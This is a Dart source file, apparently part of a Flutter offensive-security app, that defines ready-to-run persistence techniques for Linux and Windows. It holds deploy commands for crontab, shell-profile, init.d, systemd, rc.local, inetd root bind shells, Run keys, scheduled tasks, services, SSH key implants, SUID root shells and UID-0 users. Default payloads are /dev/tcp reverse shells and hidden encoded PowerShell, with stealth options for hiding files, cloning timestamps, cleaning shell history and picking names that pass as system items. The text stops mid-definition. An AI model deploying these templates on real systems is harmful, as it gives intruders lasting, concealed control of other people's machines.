import 'package:flutter/material.dart';

import '../theme/app_theme.dart';
import 'priv_esc_landing.dart';

// ═══════════════════════════════════════════════════════════════════════════════
// Data models
// ═══════════════════════════════════════════════════════════════════════════════

/// Structured detection verdict for check results.
enum DetectionVerdict {
  /// No persistence of this type found.
  clean,

  /// Persistence mechanism confirmed present.
  found,

  /// Anomalies detected — could be benign, could be malicious.
  suspicious,

  /// Check command failed (permission denied, command missing, etc).
  error,
}

/// Whether a persistence method can currently be deployed on the target.
enum ExploitabilityLevel { ready, blocked }

/// Exploitability assessment from check-phase preconditions.
class ExploitabilityResult {
  final ExploitabilityLevel level;
  final List<String> satisfied;
  final List<String> blocked;

  const ExploitabilityResult({
    required this.level,
    this.satisfied = const [],
    this.blocked = const [],
  });

  bool get isDeployable => level == ExploitabilityLevel.ready;
}

/// Structured result of a persistence check.
class DetectionResult {
  final DetectionVerdict verdict;
  final String summary; // one-line interpretation
  final String? rawOutput;
  final List<String> details; // specific lines / findings
  final double confidence; // 0.0 – 1.0
  final ExploitabilityResult? exploitability; // null = no exploitability info parsed

  const DetectionResult({
    required this.verdict,
    required this.summary,
    this.rawOutput,
    this.details = const [],
    this.confidence = 0.5,
    this.exploitability,
  });

  /// Convenience: clean with no findings.
  factory DetectionResult.clean([String? raw]) => DetectionResult(
        verdict: DetectionVerdict.clean,
        summary: 'No persistence found',
        rawOutput: raw,
        confidence: 0.95,
      );

  /// Convenience: check errored.
  factory DetectionResult.error(String reason) => DetectionResult(
        verdict: DetectionVerdict.error,
        summary: reason,
        confidence: 1.0,
      );
}

/// Per-method stealth capabilities.
class MethodStealth {
  /// Whether the file path parameter(s) can be dot-prefixed.
  final bool canDotPrefix;

  /// Whether a `touch -r` timestamp clone is possible.
  final bool canTimestampClone;

  /// Whether shell-history cleanup is applicable.
  final bool canHistoryClean;

  /// Reference file for timestamp cloning (absolute path).
  final String tsRefFile;

  const MethodStealth({
    this.canDotPrefix = false,
    this.canTimestampClone = false,
    this.canHistoryClean = true,
    this.tsRefFile = '/bin/ls',
  });
}

/// A user-fillable parameter for a deploy template.
class PersistParam {
  final String id;
  final String label;
  final String hint;
  final String defaultValue;
  final bool multiline;

  /// If true, the parameter is a filesystem path that stealth can dot-prefix.
  final bool isFilePath;

  const PersistParam({
    required this.id,
    required this.label,
    required this.hint,
    required this.defaultValue,
    this.multiline = false,
    this.isFilePath = false,
  });
}

/// Represents a single persistence technique.
class PersistMethod {
  final String id;
  final String name;
  final String description;
  final String checkCommand;
  final String deployTemplate;
  final String verifyTemplate;
  final List<PersistParam> params;
  final String warningText;
  final bool isWindows;

  /// Cleanup command template (uses same {param} placeholders).
  final String? rollbackTemplate;

  /// Commands run before deploy to check pre-conditions.
  /// Each should output `OK:...` or `FAIL:...` on its last line.
  final List<String> preflightCommands;

  /// Stealth capabilities for this method.
  final MethodStealth stealth;

  /// Whether [verifyTemplate] actually exercises the backdoor (`executable`) or
  /// only confirms the mechanism/artifact exists (`structural`). Mirrors
  /// [LandingVerifyStrength] from the priv-esc landing module.
  final LandingVerifyStrength verifyStrength;

  const PersistMethod({
    required this.id,
    required this.name,
    required this.description,
    required this.checkCommand,
    required this.deployTemplate,
    required this.verifyTemplate,
    required this.params,
    required this.warningText,
    this.isWindows = false,
    this.rollbackTemplate,
    this.preflightCommands = const [],
    this.stealth = const MethodStealth(),
    this.verifyStrength = LandingVerifyStrength.structural,
  });
}

/// A collapsible group of persistence methods.
class PersistGroup {
  final String id;
  final String title;
  final IconData icon;
  final Color color;
  final List<PersistMethod> methods;

  const PersistGroup({
    required this.id,
    required this.title,
    required this.icon,
    required this.color,
    required this.methods,
  });
}

// ═══════════════════════════════════════════════════════════════════════════════
// Helper — dot-prefix a file path
// ═══════════════════════════════════════════════════════════════════════════════

String toDotPath(String path) {
  final lastSlash = path.lastIndexOf('/');
  if (lastSlash == -1) {
    // Bare filename (no directory): dot-prefix unless already hidden.
    if (path.startsWith('.')) return path;
    return '.$path';
  }
  final dir = path.substring(0, lastSlash + 1);
  final base = path.substring(lastSlash + 1);
  if (base.startsWith('.')) return path; // already hidden
  return '$dir.$base';
}

// ═══════════════════════════════════════════════════════════════════════════════
// Method definitions
// ═══════════════════════════════════════════════════════════════════════════════

final allPersistMethods = <PersistMethod>[
  // ── Scheduled Tasks ────────────────────────────────────────────────────────

  PersistMethod(
    id: 'cron_job',
    name: 'Cron Job',
    description:
        'Add a periodic crontab entry to trigger a reverse shell or payload.',
    checkCommand:
        'which crontab >/dev/null 2>&1 && echo "EXPLOIT:OK:crontab binary available" || echo "EXPLOIT:FAIL:crontab not installed — install cron package"; crontab -l 2>&1 || echo "(no crontab or empty)"',
    deployTemplate:
        r'''(crontab -l 2>/dev/null; echo "{schedule} {command}") | crontab - && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED' ''',
    verifyTemplate:
        r"crontab -l 2>&1 | grep -qF '{command_fingerprint}' && (pgrep -x cron >/dev/null 2>&1 || pgrep -x crond >/dev/null 2>&1 && echo 'VERIFY_OK:cron_active' || echo 'VERIFY_OK:entry_exists_cron_not_running') || echo 'VERIFY_FAILED'",
    rollbackTemplate: r"crontab -l 2>/dev/null | grep -vF '{command_fingerprint}' | crontab -",
    preflightCommands: [
      '[ "\$(id -u)" = "0" ] && echo "OK:running as root" || echo "OK:running as \$(whoami)"',
    ],
    params: [
      PersistParam(
        id: 'schedule',
        label: 'Schedule',
        hint: 'e.g. */5 * * * *',
        defaultValue: '*/5 * * * *',
      ),
      PersistParam(
        id: 'command',
        label: 'Command',
        hint: "e.g. bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
        defaultValue:
            r"bash -c 'bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1'",
      ),
      PersistParam(
        id: 'command_fingerprint',
        label: 'Command fingerprint (for verify/rollback)',
        hint: 'Unique substring to identify this entry',
        defaultValue: 'REPLACE_IP/REPLACE_PORT',
      ),
    ],
    warningText:
        'A crontab entry will be appended. Existing entries are preserved. Use a unique fingerprint to enable rollback.',
    stealth: MethodStealth(canHistoryClean: true),
  ),

  PersistMethod(
    id: 'scheduled_task',
    name: 'Scheduled Task',
    description:
        'Create a Windows scheduled task to run a payload at a specified interval.',
    checkCommand: r'schtasks /query /fo LIST 2>&1 | findstr /C:"TaskName:"',
    deployTemplate:
        r'schtasks /create /tn "{task_name}" /tr "{command}" /sc {schedule} /f && echo DEPLOY_OK || echo DEPLOY_FAILED',
    verifyTemplate:
        r'schtasks /query /tn "{task_name}" /fo LIST 2>&1',
    rollbackTemplate:
        r'schtasks /delete /tn "{task_name}" /f',
    params: [
      PersistParam(
        id: 'task_name',
        label: 'Task name',
        hint: 'e.g. WindowsUpdateChecker',
        defaultValue: 'WindowsUpdateChecker',
      ),
      PersistParam(
        id: 'command',
        label: 'Command',
        hint: 'e.g. powershell -enc ...',
        defaultValue:
            'powershell -c "start-process cmd -argumentlist \'/c ping -n 30 127.0.0.1 & powershell -enc REPLACE_PAYLOAD\' -windowstyle hidden"',
      ),
      PersistParam(
        id: 'schedule',
        label: 'Schedule',
        hint: 'minute / hourly / daily / onstart',
        defaultValue: 'hourly',
      ),
    ],
    warningText:
        'Creates a named scheduled task visible in Task Scheduler. Choose a name that blends in.',
    isWindows: true,
    stealth: MethodStealth(canHistoryClean: true),
  ),

  // ── Login Triggers ─────────────────────────────────────────────────────────

  PersistMethod(
    id: 'bashrc_backdoor',
    name: 'Shell Profile (~/.bashrc)',
    description:
        'Append a command to ~/.bashrc, triggered on every interactive shell login.',
    checkCommand:
        r'[ -w "$HOME/.bashrc" ] && echo "EXPLOIT:OK:~/.bashrc writable" || echo "EXPLOIT:FAIL:~/.bashrc not writable"; found=0; for f in "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.profile"; do [ -f "$f" ] && echo "=== $f ===" && tail -20 "$f" 2>&1 && found=1; done; [ "$found" = 0 ] && echo "(no shell profile found)"',
    deployTemplate:
        r'''echo -e "\n{command} &" >> $HOME/.bashrc && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED' ''',
    verifyTemplate:
        'grep -qF "{command_fingerprint}" \$HOME/.bashrc 2>/dev/null && echo "VERIFY_OK:entry_exists" || echo "VERIFY_FAILED"',
    rollbackTemplate:
        r"sed -i '/{command_fingerprint}/d' $HOME/.bashrc",
    params: [
      PersistParam(
        id: 'command',
        label: 'Command',
        hint: "e.g. bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        defaultValue:
            r"bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1",
      ),
      PersistParam(
        id: 'command_fingerprint',
        label: 'Command fingerprint',
        hint: 'Unique substring for rollback',
        defaultValue: 'REPLACE_IP/REPLACE_PORT',
      ),
    ],
    warningText:
        'The command will be appended to ~/.bashrc and runs on every new interactive shell. It is visible to anyone who reads the file.',
    stealth: MethodStealth(canHistoryClean: true),
  ),

  PersistMethod(
    id: 'profile_d',
    name: 'Profile.d Script',
    description:
        'Drop a script into /etc/profile.d/ — executes for every user at login (requires root).',
    checkCommand:
        r'[ -d /etc/profile.d ] && ([ -w /etc/profile.d ] && echo "EXPLOIT:OK:/etc/profile.d writable" || echo "EXPLOIT:FAIL:/etc/profile.d not writable — need root") || echo "EXPLOIT:FAIL:/etc/profile.d directory not found"; ls -la /etc/profile.d/ 2>&1 | grep -Ev "README|00-header|90-updates|vim|bash_completion|grep|colorgrep|colorls|which|less" || echo "(no profile scripts found)"',
    deployTemplate:
        r'''echo "{command} &" > /etc/profile.d/.{script_name}.sh && chmod +x /etc/profile.d/.{script_name}.sh && (touch -r /etc/profile.d/vim.sh /etc/profile.d/.{script_name}.sh 2>/dev/null || true) && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED' ''',
    verifyTemplate:
        '[ -f /etc/profile.d/.{script_name}.sh ] && [ -x /etc/profile.d/.{script_name}.sh ] && bash -n /etc/profile.d/.{script_name}.sh 2>/dev/null && echo "VERIFY_OK:executable_syntax_ok" || ([ -f /etc/profile.d/.{script_name}.sh ] && echo "VERIFY_OK:file_exists" || echo "VERIFY_FAILED")',
    rollbackTemplate:
        r'rm -f /etc/profile.d/.{script_name}.sh',
    preflightCommands: [
      r'[ -w /etc/profile.d ] && echo "OK:/etc/profile.d/ is writable" || echo "FAIL:/etc/profile.d/ is not writable (need root)"',
    ],
    params: [
      PersistParam(
        id: 'script_name',
        label: 'Script name (auto dot-prefixed)',
        hint: 'e.g. bash-completion',
        defaultValue: 'bash-completion',
      ),
      PersistParam(
        id: 'command',
        label: 'Command',
        hint: "e.g. bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
        defaultValue:
            r"bash -c 'bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1'",
      ),
    ],
    warningText:
        'Requires root. The script runs as root for every user login. The dot-prefix hides it from casual listing.',
    stealth: MethodStealth(
      canDotPrefix: true,
      canTimestampClone: true,
      canHistoryClean: true,
      tsRefFile: '/etc/profile.d/vim.sh',
    ),
  ),

  PersistMethod(
    id: 'registry_run',
    name: 'Registry Run Key',
    description:
        r'Add an entry to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.',
    checkCommand:
        r'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 2>&1',
    deployTemplate:
        r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "{entry_name}" /t REG_SZ /d "{command}" /f && echo DEPLOY_OK || echo DEPLOY_FAILED',
    verifyTemplate:
        r'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "{entry_name}" 2>&1',
    rollbackTemplate:
        r'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "{entry_name}" /f',
    params: [
      PersistParam(
        id: 'entry_name',
        label: 'Entry name',
        hint: 'e.g. OneDriveUpdater',
        defaultValue: 'OneDriveUpdater',
      ),
      PersistParam(
        id: 'command',
        label: 'Command',
        hint: 'e.g. powershell -enc ...',
        defaultValue: r'powershell -enc BASE64_PAYLOAD',
      ),
    ],
    warningText:
        'The registry entry will appear in Autoruns. Use a plausible name.',
    isWindows: true,
    stealth: MethodStealth(canHistoryClean: true),
  ),

  PersistMethod(
    id: 'startup_folder',
    name: 'Startup Folder',
    description:
        'Write a .bat file to the user Startup folder, triggered on login.',
    checkCommand:
        r'dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" 2>&1',
    deployTemplate:
        r'echo {command} > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{payload_name}" && echo DEPLOY_OK || echo DEPLOY_FAILED',
    verifyTemplate:
        r'dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{payload_name}" 2>&1',
    rollbackTemplate:
        r'del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{payload_name}"',
    params: [
      PersistParam(
        id: 'payload_name',
        label: 'File name',
        hint: 'e.g. update_check.bat',
        defaultValue: 'update_check.bat',
      ),
      PersistParam(
        id: 'command',
        label: 'Batch command',
        hint: 'e.g. @echo off & start /b powershell -enc ...',
        defaultValue:
            r'@echo off & start /b powershell -windowstyle hidden -enc BASE64_PAYLOAD',
      ),
    ],
    warningText:
        'The .bat file will be visible in the Startup folder. A console window may briefly flash on login.',
    isWindows: true,
    stealth: MethodStealth(canHistoryClean: true),
  ),

  PersistMethod(
    id: 'winlogon_userinit',
    name: 'Winlogon Userinit',
    description:
        r'Append a command to the Winlogon Userinit value, run on every interactive logon.',
    checkCommand:
        r'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit 2>&1',
    deployTemplate:
        r'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,{command}" /f && echo DEPLOY_OK || echo DEPLOY_FAILED',
    verifyTemplate:
        r'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit 2>&1',
    rollbackTemplate:
        r'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f',
    params: [
      PersistParam(
        id: 'command',
        label: 'Command (executable)',
        hint: 'e.g. powershell.exe -w hidden -enc ...',
        defaultValue: r'powershell.exe -w hidden -enc BASE64_PAYLOAD',
      ),
    ],
    warningText:
        'Modifies the Winlogon Userinit value to also run your command on every logon. Requires admin. Rollback restores the default userinit.exe only — a custom original value is not preserved.',
    isWindows: true,
    stealth: MethodStealth(canHistoryClean: true),
  ),

  PersistMethod(
    id: 'logon_script',
    name: 'Logon Script',
    description:
        r'Point the user logon script to an existing script file via HKCU\Environment.',
    checkCommand:
        r'reg query "HKCU\Environment" /v UserInitMprLogonScript 2>&1',
    deployTemplate:
        r'reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "{script_path}" /f && echo DEPLOY_OK || echo DEPLOY_FAILED',
    verifyTemplate:
        r'reg query "HKCU\Environment" /v UserInitMprLogonScript 2>&1',
    rollbackTemplate:
        r'reg delete "HKCU\Environment" /v UserInitMprLogonScript /f',
    params: [
      PersistParam(
        id: 'script_path',
        label: 'Script path',
        hint: r'e.g. C:\Users\Public\update.bat',
        defaultValue: r'C:\Users\Public\update.bat',
      ),
    ],
    warningText:
        'Points the user logon script at an existing script file. Drop the script itself separately (Startup Folder or file manager). HKCU only affects the current user.',
    isWindows: true,
    stealth: MethodStealth(canHistoryClean: true),
  ),

  // ── Service Backdoors ──────────────────────────────────────────────────────

  PersistMethod(
    id: 'ssh_authorized_keys',
    name: 'SSH Authorized Keys',
    description:
        'Append a public key to ~/.ssh/authorized_keys for passwordless SSH access.',
    checkCommand:
        r'[ -d "$HOME" ] && [ -w "$HOME" ] && echo "EXPLOIT:OK:home directory writable" || echo "EXPLOIT:FAIL:home directory not writable"; [ -f "$HOME/.ssh/authorized_keys" ] && echo "=== authorized_keys (lines: $(wc -l < $HOME/.ssh/authorized_keys)) ===" && cat "$HOME/.ssh/authorized_keys" 2>&1 || echo "(no authorized_keys at \$HOME/.ssh)"',
    deployTemplate:
        r"mkdir -p $HOME/.ssh && echo '{ssh_pubkey}' >> $HOME/.ssh/authorized_keys && chmod 600 $HOME/.ssh/authorized_keys && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED'",
    verifyTemplate:
        'tail -1 \$HOME/.ssh/authorized_keys 2>/dev/null | grep -qF "{key_fingerprint}" && echo "VERIFY_OK:key_present" || echo "VERIFY_FAILED"',
    rollbackTemplate:
        r"grep -vF '{key_fingerprint}' $HOME/.ssh/authorized_keys > /tmp/.ak_tmp && mv /tmp/.ak_tmp $HOME/.ssh/authorized_keys && chmod 600 $HOME/.ssh/authorized_keys",
    params: [
      PersistParam(
        id: 'ssh_pubkey',
        label: 'SSH public key',
        hint: 'ssh-rsa AAAAB3...',
        defaultValue: 'ssh-rsa AAAAB3...REPLACE_WITH_YOUR_PUBKEY',
        multiline: true,
      ),
      PersistParam(
        id: 'key_fingerprint',
        label: 'Key fingerprint (last 20 chars of pubkey)',
        hint: 'For rollback identification',
        defaultValue: 'REPLACE_WITH_YOUR_PUBKEY',
      ),
    ],
    warningText:
        'A public key will be appended to authorized_keys. Ensure the corresponding private key is kept secure.',
    stealth: MethodStealth(canHistoryClean: true),
  ),

  PersistMethod(
    id: 'systemd_service',
    name: 'systemd Service',
    description:
        'Create a system-level systemd service unit that runs a payload on boot (requires root + systemd init).',
    checkCommand:
        r'command -v systemctl >/dev/null 2>&1 && ([ -w /etc/systemd/system ] && echo "EXPLOIT:OK:systemd (root) — /etc/systemd/system writable" || echo "EXPLOIT:FAIL:/etc/systemd/system not writable — need root") || echo "EXPLOIT:FAIL:systemctl not found — no systemd"; ls -1 /etc/systemd/system/*.service 2>/dev/null | head -20 || echo "(no system services found)"',
    deployTemplate:
        r'''mkdir -p /etc/systemd/system && printf '[Unit]\nDescription={description}\nAfter=network.target\n\n[Service]\nType=simple\nExecStart={command}\nRestart=no\n\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/{service_name}.service && systemctl daemon-reload 2>/dev/null; systemctl enable {service_name}.service 2>&1 && (systemctl start {service_name}.service 2>/dev/null || true) && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED' ''',
    verifyTemplate:
        r'''systemctl is-active {service_name}.service 2>/dev/null | grep -q '^active' && echo 'VERIFY_OK:active' || (systemctl is-enabled {service_name}.service 2>/dev/null | grep -q '^enabled' && echo 'VERIFY_OK:enabled_not_active' || (systemctl list-unit-files {service_name}.service 2>/dev/null | grep -q '{service_name}' && echo 'VERIFY_OK:unit_exists' || echo 'VERIFY_FAILED'))''',
    rollbackTemplate:
        r'''systemctl stop {service_name}.service 2>/dev/null; systemctl disable {service_name}.service 2>/dev/null; rm -f /etc/systemd/system/{service_name}.service; systemctl daemon-reload 2>/dev/null''',
    params: [
      PersistParam(
        id: 'service_name',
        label: 'Service name',
        hint: 'e.g. dbus-cache',
        defaultValue: 'dbus-cache',
      ),
      PersistParam(
        id: 'description',
        label: 'Unit description (disguise)',
        hint: 'Benign text shown in systemctl status',
        defaultValue: 'System cache maintenance',
      ),
      PersistParam(
        id: 'command',
        label: 'ExecStart command',
        hint: 'e.g. /bin/bash -c ...',
        defaultValue:
            r'/bin/bash -c "bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1"',
      ),
    ],
    warningText:
        'Requires root and systemd as PID 1. Writes a unit under /etc/systemd/system and enables it to run on boot. Visible in systemctl list-unit-files and systemctl status.',
    stealth: MethodStealth(
      canDotPrefix: false,
      canTimestampClone: true,
      canHistoryClean: true,
    ),
  ),

  PersistMethod(
    id: 'initd_script',
    name: 'init.d Startup Script',
    description:
        'Drop an executable script into /etc/init.d/ and register it to run at boot (requires root).',
    checkCommand:
        r'[ -d /etc/init.d ] && ([ -w /etc/init.d ] && echo "EXPLOIT:OK:/etc/init.d writable" || echo "EXPLOIT:FAIL:/etc/init.d not writable — need root") || echo "EXPLOIT:FAIL:/etc/init.d not found"; ls -la /etc/init.d/ 2>&1 | grep -Ev "^total|README|rc|umount|halt|reboot|single|skeleton|functions|networking|procps|kmod|cron|dbus|ssh|udev" | head -20 || echo "(no init.d scripts found)"',
    deployTemplate:
        r'''printf '#!/bin/sh\n### BEGIN INIT INFO\n# Provides:          {name}\n### END INIT INFO\n' > /etc/init.d/.{name} && echo "{command} &" >> /etc/init.d/.{name} && chmod 755 /etc/init.d/.{name} && (update-rc.d .{name} defaults 2>/dev/null || chkconfig .{name} on 2>/dev/null || (ln -sf /etc/init.d/.{name} /etc/rc3.d/S99.{name} 2>/dev/null)) && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED' ''',
    verifyTemplate:
        r'[ -x /etc/init.d/.{name} ] && echo "VERIFY_OK:executable" || ([ -f /etc/init.d/.{name} ] && echo "VERIFY_OK:exists" || echo "VERIFY_FAILED")',
    rollbackTemplate:
        r'(update-rc.d -f .{name} remove 2>/dev/null; chkconfig .{name} off 2>/dev/null; chkconfig --del .{name} 2>/dev/null; rm -f /etc/init.d/.{name} /etc/rc*.d/*.{name})',
    preflightCommands: [
      r'[ -w /etc/init.d ] && echo "OK:/etc/init.d writable" || echo "FAIL:/etc/init.d not writable (need root)"',
    ],
    params: [
      PersistParam(
        id: 'name',
        label: 'Script name (auto dot-prefixed)',
        hint: 'e.g. network-sync',
        defaultValue: 'network-sync',
      ),
      PersistParam(
        id: 'command',
        label: 'Command',
        hint: "e.g. bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
        defaultValue:
            r"bash -c 'bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1'",
      ),
    ],
    warningText:
        'Requires root. Registers a boot-time init script visible in /etc/init.d. The dot-prefix hides it from casual listing.',
    stealth: MethodStealth(
      canDotPrefix: true,
      canTimestampClone: true,
      canHistoryClean: true,
      tsRefFile: '/etc/init.d/rc',
    ),
  ),

  PersistMethod(
    id: 'rc_local',
    name: 'rc.local Script',
    description:
        'Insert a command before `exit 0` in /etc/rc.local so it runs at boot (requires root).',
    checkCommand:
        r'[ -f /etc/rc.local ] && [ -w /etc/rc.local ] && echo "EXPLOIT:OK:/etc/rc.local writable" || echo "EXPLOIT:FAIL:/etc/rc.local not writable or missing"; tail -20 /etc/rc.local 2>&1 || echo "(no rc.local)"',
    deployTemplate:
        r'''grep -qF '{fingerprint}' /etc/rc.local 2>/dev/null || sed -i "/^[[:space:]]*exit 0[[:space:]]*$/i {command} &" /etc/rc.local; grep -qF '{fingerprint}' /etc/rc.local && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED' ''',
    verifyTemplate:
        r"grep -qF '{fingerprint}' /etc/rc.local 2>/dev/null && echo 'VERIFY_OK:entry_exists' || echo 'VERIFY_FAILED'",
    rollbackTemplate:
        r"sed -i '/{fingerprint}/d' /etc/rc.local",
    preflightCommands: [
      r'[ -f /etc/rc.local ] && [ -w /etc/rc.local ] && echo "OK:/etc/rc.local writable" || echo "FAIL:/etc/rc.local not writable or missing (need root)"',
    ],
    params: [
      PersistParam(
        id: 'command',
        label: 'Command',
        hint: "e.g. bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
        defaultValue:
            r"bash -c 'bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1'",
      ),
      PersistParam(
        id: 'fingerprint',
        label: 'Command fingerprint',
        hint: 'Unique substring for verify/rollback',
        defaultValue: 'REPLACE_IP/REPLACE_PORT',
      ),
    ],
    warningText:
        'Requires root. Inserts the command just before the first `exit 0` in /etc/rc.local (must contain one). Runs as root at every boot.',
    stealth: MethodStealth(canHistoryClean: true),
  ),

  PersistMethod(
    id: 'inetd_backdoor',
    name: 'inetd Bind Shell',
    description:
        'Add an inetd service line that binds a root shell to a TCP port.',
    checkCommand:
        r'[ -w /etc ] && echo "EXPLOIT:OK:/etc writable (can create inetd.conf)" || echo "EXPLOIT:FAIL:/etc not writable — need root"; grep -v "^#" /etc/inetd.conf 2>/dev/null | grep -v "^$" || echo "(no active inetd services)"',
    deployTemplate:
        r"echo '{port} stream tcp nowait root /bin/sh sh -i' >> /etc/inetd.conf && (killall -HUP inetd 2>/dev/null || systemctl restart inetd 2>/dev/null || service xinetd reload 2>/dev/null || true) && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED'",
    verifyTemplate:
        r"grep -F '{port} stream' /etc/inetd.conf 2>/dev/null && echo 'VERIFY_OK:entry_exists' || echo 'VERIFY_FAILED'",
    rollbackTemplate:
        r"sed -i '/{port} stream/d' /etc/inetd.conf",
    preflightCommands: [
      r'[ -w /etc/inetd.conf ] && echo "OK:/etc/inetd.conf writable" || echo "FAIL:/etc/inetd.conf not writable (need root)"',
    ],
    params: [
      PersistParam(
        id: 'port',
        label: 'Port',
        hint: 'e.g. 4444',
        defaultValue: '4444',
      ),
    ],
    warningText:
        'Requires inetd/xinetd and root. Binds a root shell on the chosen TCP port (no authentication). Modern systems may use xinetd with /etc/xinetd.d/ instead.',
    stealth: MethodStealth(canHistoryClean: true),
  ),

  PersistMethod(
    id: 'sc_service',
    name: 'Windows Service (sc.exe)',
    description:
        'Create an auto-start Windows service that runs a command.',
    checkCommand:
        r'sc query state= all 2>&1 | findstr /C:"SERVICE_NAME:"',
    deployTemplate:
        r'sc create {service_name} binPath= "cmd /c {command}" start= auto DisplayName= "{display_name}" && echo DEPLOY_OK || echo DEPLOY_FAILED',
    verifyTemplate:
        r'sc query {service_name} 2>&1',
    rollbackTemplate:
        r'sc stop {service_name} & sc delete {service_name}',
    params: [
      PersistParam(
        id: 'service_name',
        label: 'Service name',
        hint: 'e.g. WinUpdateSync',
        defaultValue: 'WinUpdateSync',
      ),
      PersistParam(
        id: 'display_name',
        label: 'Display name',
        hint: 'e.g. Windows Update Sync Service',
        defaultValue: 'Windows Update Sync Service',
      ),
      PersistParam(
        id: 'command',
        label: 'Command',
        hint: 'e.g. powershell.exe -w hidden -enc ...',
        defaultValue: r'powershell.exe -w hidden -enc BASE64_PAYLOAD',
      ),
    ],
    warningText:
        'Creates an auto-start Windows service running your command. Requires admin. A service running a bare command (not a real service binary) may report error 1053 unless it stays alive.',
    isWindows: true,
    stealth: MethodStealth(canHistoryClean: true),
  ),

  // ── Privilege Backdoors ────────────────────────────────────────────────────

  PersistMethod(
    id: 'suid_shell',
    name: 'SUID Shell',
    description:
        'Copy /bin/bash to a hidden location with SUID bit. Execute with `-p` to get root.',
    checkCommand:
        r'[ -w /tmp ] && echo "EXPLOIT:OK:/tmp writable" || echo "EXPLOIT:FAIL:/tmp not writable"; [ "$(id -u)" = "0" ] && echo "EXPLOIT:OK:running as root (SUID will work)" || echo "EXPLOIT:FAIL:not root — chmod 4755 needs root-owned file for root SUID"; echo "=== SUID shells in non-standard paths ===" && find /bin /usr/bin /usr/local/bin /tmp /opt /sbin /usr/sbin /var/tmp -maxdepth 3 -perm -4000 -type f \( -name "bash" -o -name "dash" -o -name "sh" -o -name "zsh" \) 2>/dev/null | grep -v "^/bin/\|^/usr/bin/" | head -10; stat -c "%a %n" /tmp/.[!.]* 2>/dev/null | grep "4755" || echo "(no SUID backdoor found)"',
    // deploy/verify/rollback share the canonical landing templates
    // (single source of truth in priv_esc_landing.dart).
    deployTemplate: landingById('suid_shell').deployTemplate,
    verifyTemplate: landingById('suid_shell').verifyTemplate,
    rollbackTemplate: landingById('suid_shell').rollbackTemplate,
    preflightCommands: [
      '[ -w /tmp ] && echo "OK:/tmp writable" || echo "FAIL:/tmp not writable"',
      '[ -x /bin/bash ] && echo "OK:/bin/bash exists" || echo "FAIL:/bin/bash not found"',
    ],
    params: [
      PersistParam(
        id: 'mimic',
        label: 'Hidden file name',
        hint: 'e.g. kworker, dbus-daemon, systemd-coredump',
        defaultValue: 'kworker',
      ),
    ],
    warningText:
        'Creates a SUID root shell at a hidden /tmp/.<name>. Use `/tmp/.<name> -p` to get euid=0. Bash drops SUID by default unless invoked with -p.',
    stealth: MethodStealth(
      canDotPrefix: false,
      canTimestampClone: false,
      canHistoryClean: true,
      tsRefFile: '/bin/ls',
    ),
    verifyStrength: LandingVerifyStrength.executable,
  ),

  PersistMethod(
    id: 'root_user',
    name: 'Root User (passwd)',
    description:
        'Add a UID-0 user to /etc/passwd. Log in with `su {username}` to get root.',
    checkCommand:
        r'[ -w /etc/passwd ] && echo "EXPLOIT:OK:/etc/passwd writable" || echo "EXPLOIT:FAIL:/etc/passwd not writable — need root"; (command -v openssl >/dev/null 2>&1 || command -v perl >/dev/null 2>&1 || command -v ruby >/dev/null 2>&1) && echo "EXPLOIT:OK:crypt tool available (openssl/perl/ruby)" || echo "EXPLOIT:FAIL:no openssl, perl, or ruby — cannot generate crypt hash"; cut -d: -f1,3 /etc/passwd 2>/dev/null | grep ":0$" || echo "(no UID 0 entries found)"',
    // deploy/verify/rollback share the canonical landing templates.
    deployTemplate: landingById('passwd_user').deployTemplate,
    verifyTemplate: landingById('passwd_user').verifyTemplate,
    rollbackTemplate: landingById('passwd_user').rollbackTemplate,
    preflightCommands: [
      '[ -w /etc/passwd ] && echo "OK:/etc/passwd writable" || echo "FAIL:/etc/passwd not writable (need root)"',
      '(command -v openssl >/dev/null 2>&1 || command -v perl >/dev/null 2>&1 || command -v ruby >/dev/null 2>&1) && echo "OK:crypt tool available (openssl/perl/ruby)" || echo "FAIL:no openssl, perl, or ruby — cannot generate crypt hash"',
    ],
    params: [
      PersistParam(
        id: 'username',
        label: 'Username (disguise)',
        hint: 'e.g. messagebus, systemd-network, daemon',
        defaultValue: 'messagebus',
      ),
      PersistParam(
        id: 'password',
        label: 'Password',
